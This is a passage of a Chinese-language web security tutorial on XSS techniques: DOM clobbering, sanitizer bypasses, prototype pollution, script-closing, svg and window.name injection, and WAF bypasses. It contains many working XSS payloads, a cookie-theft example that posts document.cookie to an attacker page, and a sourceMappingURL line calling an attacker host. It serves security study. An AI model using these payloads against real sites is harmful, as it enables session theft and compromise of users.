<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span>(<span class="built_in">document</span>)&#123;</span><br><span class="line">	<span class="keyword">with</span>(element) &#123;</span><br><span class="line">		<span class="comment">// executed event</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因此，我们可以在html事件中，可以使用<code>document</code>下的任何方法，如：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span>/<span class="attr">src</span>/<span class="attr">onerror</span>=<span class="string">s</span>=<span class="string">createElement(</span>'<span class="attr">script</span>');<span class="attr">s.append</span>('<span class="attr">alert</span>(<span class="attr">1337</span>)');<span class="attr">appendChild</span>(<span class="attr">s</span>)&gt;</span></span><br></pre></td></tr></table></figure>
<p>注意：在正常的js代码中，无法直接执行<code>appendChild</code>，需要指定一个节点。上面的例子中，则会默认加入到<code>img</code>节点中。</p>
<h4 id="DOM-clobbering技术"><a href="#DOM-clobbering技术" class="headerlink" title="DOM clobbering技术"></a>DOM clobbering技术</h4><p>DOM clobbering 是一种攻击技术，它利用 JavaScript 中的对象属性查找机制来修改或覆盖 DOM 中的原生对象和属性。</p>
<p><strong>破坏DOM元素对象的属性</strong></p>
<p>测试如下代码，url的值会是<code>http:///example.com</code>，因为window中不存在变量<code>currentUrl</code>。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> url = <span class="built_in">window</span>.currentUrl || <span class="string">'http:///example.com'</span>;</span><br></pre></td></tr></table></figure>
<p>但是再测试如下代码，可以发现dom中的存在属性<code>currentUrl</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">'currentUrl'</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span>	</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">	<span class="keyword">let</span> url = <span class="built_in">window</span>.currentUrl || <span class="string">'http:///example.com'</span>;</span></span><br><span class="line"><span class="actionscript">	alert(url) <span class="comment">// [object HTMLFormElement]</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>利用这个特性，我们可以修改dom的属性，除了name变量，html中id也可以用来定位元素：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">x</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">y</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">	alert(x) <span class="comment">// [object HTMLFormElement]</span></span></span><br><span class="line"><span class="javascript">	alert(<span class="built_in">document</span>.x) <span class="comment">// undefined</span></span></span><br><span class="line"><span class="actionscript">	alert(y) <span class="comment">// [object HTMLFormElement]</span></span></span><br><span class="line"><span class="javascript">	alert(<span class="built_in">document</span>.y) <span class="comment">// [object HTMLFormElement]</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>从输出结果可以看到，全局变量x和y可以直接访问，但是通过id定义的属性，是不会修改dom。而name定义的属性，是可以修改dom的，通过name来修改dom的html标签有<code>embed</code>、 <code>form</code>、<code>iframe</code>、<code>image</code>、<code>img</code> 、<code>object</code>.</p>
<p>当我们对x或者y进行输出是，实际调用了元素的<code>toString</code>方法，但是如果存在<code>href</code>属性，则会输出<code>href</code>定义的值：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"test:aaaa"</span> <span class="attr">id</span>=<span class="string">x</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">	alert(x) <span class="comment">// test:aaaa</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>当存在相同的id的情况下，将会是一个数组：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"test:aaaa"</span> <span class="attr">id</span>=<span class="string">x</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"test:bbbb"</span> <span class="attr">id</span>=<span class="string">x</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">	alert(x[<span class="number">0</span>]) <span class="comment">// test:aaaa</span></span></span><br><span class="line"><span class="actionscript">	alert(x[<span class="number">1</span>]) <span class="comment">// test:bbbb</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>对于嵌套的html元素，访问方式如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">name</span>=<span class="string">y</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">z</span> <span class="attr">value</span>=<span class="string">1337</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">x</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">	alert(x.y.z.value)<span class="comment">//1337</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>处理常见的标签，<code>iframe</code>标签会存在一个例外，<code>srcdoc</code>属性内的值也可以访问，注意<code>style</code>标签的作用，否则<code>foo.bar</code>会是<code>undefined</code>：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">foo</span> <span class="attr">srcdoc</span>=<span class="string">"&lt;a id=bar href='test:aaa'&gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">	<span class="comment">/*	这里style标签是为了让srcdoc完成渲染 */</span></span></span><br><span class="line"><span class="css">	<span class="keyword">@import</span> <span class="string">'https://garethheyes.co.uk'</span>; </span></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">	alert(foo) <span class="comment">// [object Window]</span></span></span><br><span class="line"><span class="actionscript">	alert(foo.bar) <span class="comment">// test:aaa</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>破坏过滤器</strong></p>
<p>首先自定义一个过滤代码，过去以<code>on</code>开头的事件：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">onclick</span>=<span class="string">alert(1)</span> <span class="attr">onmousemove</span>=<span class="string">alert(2)</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">	<span class="keyword">for</span> (<span class="keyword">let</span> i=<span class="built_in">document</span>.getElementById(<span class="string">'x'</span>).attributes.length <span class="number">-1</span> ; i &gt;=<span class="number">0</span>; i--)&#123;</span></span><br><span class="line"><span class="javascript">		<span class="keyword">let</span> attribute = <span class="built_in">document</span>.getElementById(<span class="string">'x'</span>).attributes[i]</span></span><br><span class="line"><span class="javascript">		<span class="keyword">if</span>(!<span class="regexp">/^on/i</span>.test(attribute.name)) &#123;</span></span><br><span class="line"><span class="actionscript">			<span class="keyword">continue</span></span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="javascript">		<span class="built_in">document</span>.getElementById(<span class="string">'x'</span>).removeAttribute(attribute.name)</span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>在浏览器执行后，不会进行弹窗，因为dom中已经对on开头的事件进行了删除，但是通过在from表达下自定<code>name=attributes</code>的属性，可以对过滤器进行破坏，如下所示，因为<code>document.getElementById(&#39;x&#39;).attributes[i]</code>会获取到一个<code>img</code>对象，不会进入for循环：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">onclick</span>=<span class="string">alert(1)</span> <span class="attr">onmousemove</span>=<span class="string">alert(2)</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">img</span> <span class="attr">name</span>=<span class="string">"attributes"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">	<span class="keyword">for</span> (<span class="keyword">let</span> i=<span class="built_in">document</span>.getElementById(<span class="string">'x'</span>).attributes.length <span class="number">-1</span> ; i &gt;=<span class="number">0</span>; i--)&#123;</span></span><br><span class="line"><span class="javascript">		<span class="keyword">let</span> attribute = <span class="built_in">document</span>.getElementById(<span class="string">'x'</span>).attributes[i]</span></span><br><span class="line"><span class="javascript">		<span class="keyword">if</span>(!<span class="regexp">/^on/i</span>.test(attribute.name)) &#123;</span></span><br><span class="line"><span class="actionscript">			<span class="keyword">continue</span></span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="javascript">		<span class="built_in">document</span>.getElementById(<span class="string">'x'</span>).removeAttribute(attribute.name)</span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>除了破坏<code>attributes</code>属性，<code>tagName</code>、<code>nodeName</code>都可以破坏。</p>
<p><strong>Clobbering document.getElementById()</strong></p>
<p>当页面中含有id相同的元素时，使用<code>document.getElementById()</code>通常会获取第一个元素，但是<code>html</code>和<code>body</code>会改变这种顺序</p>
<p>正常情况：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"x"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"x"</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">	alert(<span class="built_in">document</span>.getElementById(<span class="string">'x'</span>)) <span class="comment">//[object HTMLDivElement]</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>使用<code>body</code>:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"x"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">id</span>=<span class="string">"x"</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">	alert(<span class="built_in">document</span>.getElementById(<span class="string">'x'</span>)) <span class="comment">//[object HTMLBodyElement]</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>利用这个特性，在某些情况下，可以绕过CSP的保护。如果页面存在html注入，注入的位置在所有标签之后，则可以破坏<code>getElementById</code>，来使用自己的元素，需要根据实际情况来利用。</p>
<p><strong>Clobbering document.querySelector()</strong></p>
<p>除了<code>getElementById()</code>，<code>querySelector()</code>也有这个特性：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"x"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">class</span>=<span class="string">"x"</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">   alert(<span class="built_in">document</span>.querySelector(<span class="string">'.x'</span>)) <span class="comment">//[object HTMLBodyElement]</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="原型污染"><a href="#原型污染" class="headerlink" title="原型污染"></a>原型污染</h3><p>相关文章：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</span><br></pre></td></tr></table></figure>
<p>测试如下代码，发现第二个执行成功。原因是<code>__proto__</code>属性无法被直接赋值，只有当调用<code>getter/setter</code>方法时，才可以更改<code>__proto__</code>属性。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(&#123;<span class="attr">__proto__</span>:<span class="string">"foo"</span>&#125;).hasOwnProperty(<span class="string">'__proto__'</span>) <span class="comment">// false</span></span><br><span class="line">(<span class="built_in">JSON</span>.parse(<span class="string">'&#123;"__proto__":"foo"&#125;'</span>)).hasOwnProperty(<span class="string">'__proto__'</span>) <span class="comment">//true</span></span><br></pre></td></tr></table></figure>
<p>当我们对一个不存在的属性进行赋值时，是可以成功的，以下是几种赋值方法：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;&#125;</span><br><span class="line">obj.__proto__[<span class="string">'foo1'</span>] = <span class="string">'bar1'</span> <span class="comment">// 第一种方式</span></span><br><span class="line">obj.constructor[<span class="string">'prototype'</span>][<span class="string">'foo2'</span>] = <span class="string">'bar2'</span> <span class="comment">// 第二种方式</span></span><br><span class="line">obj.__proto__.foo3 = <span class="string">'bar3'</span> <span class="comment">// 第三种方式</span></span><br><span class="line"><span class="keyword">let</span> test = &#123;&#125;</span><br><span class="line">test.foo1 <span class="comment">// bar1</span></span><br><span class="line">test.foo2 <span class="comment">// bar2</span></span><br><span class="line">test.foo3 <span class="comment">// bar3</span></span><br></pre></td></tr></table></figure>
<p>通过原型污染，可以网络请求做出修改：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.prototype.body=<span class="string">'foo=bar'</span> <span class="comment">// 修改body</span></span><br><span class="line"><span class="built_in">Object</span>.prototype.headers=&#123;<span class="attr">foo</span>:<span class="string">'bar'</span>&#125;; <span class="comment">// 修改header</span></span><br><span class="line"><span class="keyword">const</span> request = <span class="keyword">new</span> Request(<span class="string">'/api'</span>, &#123;</span><br><span class="line">    method: <span class="string">'POST'</span></span><br><span class="line">&#125;)</span><br><span class="line">fetch(request) <span class="comment">// post请求中会携带foo=bar</span></span><br></pre></td></tr></table></figure>
<p>可以通过修改<code>Object.prototype.configurable=true;</code>和<code>Object.prototype.writable=true;</code>，来实现对属性的重写。</p>
<h3 id="XSS构造"><a href="#XSS构造" class="headerlink" title="XSS构造"></a>XSS构造</h3><h4 id="通过闭合script"><a href="#通过闭合script" class="headerlink" title="通过闭合script"></a>通过闭合script</h4><p>因为<code>script</code>标签具有较高的优先级，使用<code>&lt;/script&gt;</code>提前关闭script，然后再注入xss代码。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> foo=<span class="string">"</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">img</span>/<span class="attr">src</span>/<span class="attr">onerror</span>=<span class="string">alert(1337)</span>&gt;</span>"; </span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>当有2个注入点时：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> foo = <span class="string">"&lt;!-- &lt;script&gt;"</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">title</span>=<span class="string">"&lt;/script&gt;&lt;img/src/onerror=alert(1)&gt;"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="使用svg标签"><a href="#使用svg标签" class="headerlink" title="使用svg标签"></a>使用svg标签</h4><p>在svg标签内，使用实体编码的字符，也将会自动解码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> foo = <span class="string">"&amp;quot;-alert(1)//"</span></span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>当在火狐浏览器中，可以不用构造script闭合：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">scripthref=data:,alert(1)</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="注入window"><a href="#注入window" class="headerlink" title="注入window"></a>注入window</h4><p>当页面通过<code>iframe</code>加载一个页面，通过<code>iframe</code>的name属性可以控制子页面的<code>window.name</code>的值：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">//target</span> <span class="attr">name</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--target--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(<span class="built_in">window</span>.name)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>走私cookie:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">name=<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"//attacker"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--attacker page--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    fetch(<span class="string">'cookies'</span>, &#123;method: <span class="string">'post'</span>, body: name&#125;)</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="sourceMappingURL注释"><a href="#sourceMappingURL注释" class="headerlink" title="sourceMappingURL注释"></a>sourceMappingURL注释</h4><p><code>sourceMappingURL</code>是一个特殊的注释，通常添加在JavaScript或CSS文件的末尾。它的主要作用是提供一个链接到外部源映射文件的路径。</p>
<p>在开发工具（如浏览器的开发者工具）中，当浏览器遇到<code>sourceMappingURL</code>注释时，它会自动加载相应的源映射文件，并使用它来还原压缩后的文件的原始结构和源代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//#sourceMappingURL=https://attacker?</span><br></pre></td></tr></table></figure>
<p>注意：浏览器的网络选项卡，不会显示该请求。需要进行带外测试。</p>
<h4 id="新的重定向方式"><a href="#新的重定向方式" class="headerlink" title="新的重定向方式"></a>新的重定向方式</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.location.href = <span class="string">'https://www.baidu.com'</span> <span class="comment">// 常见的方式</span></span><br><span class="line">navigation.navigate(<span class="string">'https://www.baidu.com'</span>) <span class="comment">// 新的方式</span></span><br><span class="line">navigation.navigate(<span class="string">'javascript:alert(1337)'</span>) <span class="comment">// 用来执行xss</span></span><br></pre></td></tr></table></figure>
<h4 id="引入新行"><a href="#引入新行" class="headerlink" title="引入新行"></a>引入新行</h4><p>当注入点在注释中时，并且通过<code>eval</code>来执行，可以通过换行等操作，来绕过：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">'//\ralert(1337)'</span>);<span class="comment">//carriagereturn</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">'//\nalert(1337)'</span>);<span class="comment">//linefeed</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">'//\u2028alert(1337)'</span>);<span class="comment">//lineseparator</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">'//\u2029alert(1337)'</span>);<span class="comment">//paragraphseparator</span></span><br></pre></td></tr></table></figure>
<h4 id="利用空白符"><a href="#利用空白符" class="headerlink" title="利用空白符"></a>利用空白符</h4><p>前面fuzz那一章节，提到对函数x的调用：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">log = []</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;=<span class="number">0x10ffff</span>; i++)&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">eval</span>(<span class="string">`x<span class="subst">$&#123;<span class="built_in">String</span>.fromCodePoint(i)&#125;</span>()`</span>);</span><br><span class="line">      	log.push(i)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">log <span class="comment">// [9, 10, 11, 12, 13, 32, 160, 5760, 8192, 8193, 8194, 8195, 8196, 8197, 8198, 8199, 8200, 8201, 8202, 8232, 8233, 8239, 8287, 12288, 65279]</span></span><br></pre></td></tr></table></figure>
<p>利用这一特性，可以尝试绕过waf：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span>/<span class="attr">src</span>/<span class="attr">onerror</span>=<span class="string">alert&amp;#65279;(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="动态导入"><a href="#动态导入" class="headerlink" title="动态导入"></a>动态导入</h4><p>JavaScrip允许通过<code>import</code>动态加载模块，也将会导致xss</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>(<span class="string">'data:text/javascript,alert(1)'</span>)</span><br></pre></td></tr></table></figure>
<h4 id="控制text-xml"><a href="#控制text-xml" class="headerlink" title="控制text/xml"></a>控制text/xml</h4><p>如果响应类型为<code>text/xml</code>，且内容可控，也可以造成xss:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xml</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">text</span>&gt;</span>hello<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"1"</span> <span class="attr">onerror</span>=<span class="string">"alert(1)"</span> /&gt;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xml</span>&gt;</span></span><br></pre></td></tr></table></figure>
